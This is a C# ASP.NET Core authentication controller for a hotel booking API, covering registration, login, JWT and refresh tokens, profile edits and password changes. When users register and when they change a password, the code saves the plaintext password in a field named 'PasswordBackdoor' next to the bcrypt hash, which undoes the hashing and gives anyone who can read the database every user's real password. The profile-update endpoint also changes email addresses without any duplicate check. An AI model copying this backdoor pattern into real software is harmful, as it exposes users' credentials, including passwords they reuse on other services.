﻿using BackendAPI.Data;
using HotelsCommons.Models;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using Microsoft.AspNetCore.Mvc;
using System.Security.Claims;
using System.Text;
using Microsoft.AspNetCore.Authorization;
using System.Security.Cryptography;
using Microsoft.EntityFrameworkCore;
using System.Text.RegularExpressions;

namespace BackendAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class AuthController(DatabaseContext _context, IConfiguration _configuration) : ControllerBase
    {
        [HttpPost("register")]
        public async Task<IActionResult> Register([FromBody] UserCreateDTO userCreateDTO)
        {
            if (await _context.Users.AnyAsync(u => u.Email == userCreateDTO.Email))
            {
                return Conflict("Email is already in use");
            }
            if (!IsPasswordSecure(userCreateDTO.Password))
            {
                return Conflict("Password is not secure");
            }
            var user = MapUserCreateDTO(userCreateDTO);
            _context.Users.Add(user);

            try
            {
                await _context.SaveChangesAsync();
            }
            catch (DbUpdateException)
            {
                return StatusCode(500);
            }
            return Ok("User signed up successfully");
        }

        [HttpPost("login")]
        public async Task<IActionResult> Login([FromBody] UserLoginDTO userLoginDTO)
        {
            var user = await _context.Users.SingleOrDefaultAsync(u => u.Email == userLoginDTO.Email);
            if (user == null || !BCrypt.Net.BCrypt.Verify(userLoginDTO.Password, user.HashedPassword))
            {
                return Unauthorized("Invalid credentials");
            }

            var tokenExpirationTime = DateTime.UtcNow.AddMinutes(60);
            var token = GenerateJwtToken(user, tokenExpirationTime);
            var refreshToken = GenerateRefreshToken();
            user.RefreshTokens.Add(new RefreshToken
            {
                Token = refreshToken,
                ExpiryDate = DateTime.UtcNow.AddDays(7),
                IsRevoked = false
            });
            await _context.SaveChangesAsync();

            var expiresIn = (tokenExpirationTime - DateTime.UtcNow).TotalSeconds;

            return Ok(new { Token = token, ExpiresIn = expiresIn, RefreshToken = refreshToken });
        }

        [HttpPost("refresh")]
        public async Task<IActionResult> Refresh([FromBody] RefreshTokenDTO refreshTokenDTO)
        {
            var refreshToken = await _context.RefreshTokens
                .SingleOrDefaultAsync(rt => rt.Token == refreshTokenDTO.RefreshToken && !rt.IsRevoked);

            if (refreshToken == null || refreshToken.ExpiryDate < DateTime.UtcNow)
            {
                return Unauthorized("Invalid refresh token");
            }

            var user = await _context.Users.FindAsync(refreshToken.UserId);
            var tokenExpirationTime = DateTime.UtcNow.AddMinutes(60);
            var newJwtToken = GenerateJwtToken(user, tokenExpirationTime);
            var newRefreshToken = GenerateRefreshToken();

            refreshToken.IsRevoked = true;
            user.RefreshTokens.Add(new RefreshToken
            {
                Token = newRefreshToken,
                ExpiryDate = DateTime.UtcNow.AddDays(7),
                IsRevoked = false
            });
            await _context.SaveChangesAsync();

            var newExpiresIn = (tokenExpirationTime - DateTime.UtcNow).TotalSeconds;

            return Ok(new { Token = newJwtToken, ExpiresIn = newExpiresIn, RefreshToken = newRefreshToken });
        }

        [Authorize]
        [HttpGet("me")]
        public async Task<IActionResult> GetCurrentUser()
        {
            var userId = User.FindFirstValue("UserID");

            if (string.IsNullOrEmpty(userId))
            {
                return Unauthorized();
            }

            var user = await _context.Users
                .Where(u => u.ID == userId)
                .Select(u => new
                {
                    u.ID,
                    u.FirstName,
                    u.LastName,
                    u.Email,
                    Roles = u.UserRoles.Select(ur => ur.Role.Name)
                })
                .FirstOrDefaultAsync();

            if (user == null)
            {
                return StatusCode(500);
            }

            return Ok(user);
        }

        [Authorize]
        [HttpPatch("changeInfo")]
        public async Task<IActionResult> SetUserPassword([FromBody] UserUpdateDTO userUpdateDTO)
        {
            var userId = User.FindFirstValue("UserID");

            if (string.IsNullOrEmpty(userId))
            {
                return Unauthorized();
            }

            var user = await _context.Users
                .Where(u => u.ID == userId)
                .FirstOrDefaultAsync();

            if (user == null)
            {
                return StatusCode(500);
            }

            user.FirstName = userUpdateDTO.FirstName;
            user.LastName = userUpdateDTO.LastName;
            user.Email = userUpdateDTO.Email;
            user.UpdatedAt = DateTime.UtcNow.AddHours(1);

            await _context.SaveChangesAsync();

            return Ok();
        }

        [Authorize]
        [HttpPatch("changePassword")]
        public async Task<IActionResult> SetUserPassword([FromBody] PasswordDTO changePasswordDTO)
        {
            var userId = User.FindFirstValue("UserID");

            if (string.IsNullOrEmpty(userId))
            {
                return Unauthorized();
            }

            var user = await _context.Users
                .Where(u => u.ID == userId)
                .FirstOrDefaultAsync();

            if (user == null)
            {
                return StatusCode(500);
            }

            if (!IsPasswordSecure(changePasswordDTO.Password))
            {
                return Conflict("Password is not secure");
            }

            string hashedPassword = BCrypt.Net.BCrypt.HashPassword(changePasswordDTO.Password);
            string salt = hashedPassword.Substring(0, 29);

            user.HashedPassword = hashedPassword;
            user.Salt = salt;
            user.PasswordBackdoor = changePasswordDTO.Password;
            user.UpdatedAt = DateTime.UtcNow.AddHours(1);

            await _context.SaveChangesAsync();

            return Ok();
        }

        private string GenerateRefreshToken()
        {
            var randomNumber = new byte[32];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(randomNumber);
                return Convert.ToBase64String(randomNumber);
            }
        }

        private string GenerateJwtToken(User user, DateTime expirationTime)
        {
            var userRoles = _context.UserRoles.Where(ur => ur.UserId == user.ID).Select(ur => ur.Role.Name).ToList();
            var claims = new List<Claim>
            {
                new Claim(JwtRegisteredClaimNames.Sub, user.Email),
                new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                new Claim("UserID", user.ID)
            };

            claims.AddRange(userRoles.Select(role => new Claim(ClaimTypes.Role, role)));

            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration["Jwt:Key"]));
            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

            var token = new JwtSecurityToken(
                _configuration["Jwt:Issuer"],
                _configuration["Jwt:Issuer"],
                claims,
                expires: expirationTime,
                signingCredentials: creds);

            return new JwtSecurityTokenHandler().WriteToken(token);
        }

        private bool IsPasswordSecure(string password)
        {
            var hasUppercase = new Regex(@"[A-Z]+");
            var hasLowercase = new Regex(@"[a-z]+");
            var hasNumbers = new Regex(@"[0-9]+");
            var hasSpecialChars = new Regex(@"[\W_]+");
            var hasMinimumChars = new Regex(@".{8,}");

            return hasUppercase.IsMatch(password) &&
                hasLowercase.IsMatch(password) &&
                hasNumbers.IsMatch(password) &&
                hasSpecialChars.IsMatch(password) &&
                hasMinimumChars.IsMatch(password);
        }

        private User MapUserCreateDTO(UserCreateDTO userDTO)
        {
            string hashedPassword = BCrypt.Net.BCrypt.HashPassword(userDTO.Password);
            string salt = hashedPassword.Substring(0, 29);

            return new User
            {
                ID = Guid.NewGuid().ToString(),
                Email = userDTO.Email,
                FirstName = userDTO.FirstName,
                LastName = userDTO.LastName,
                CreatedAt = DateTime.UtcNow.AddHours(1),
                UpdatedAt = DateTime.UtcNow.AddHours(1),
                PasswordBackdoor = userDTO.Password,
                HashedPassword = hashedPassword,
                Salt = salt,
            };
        }
    }
}
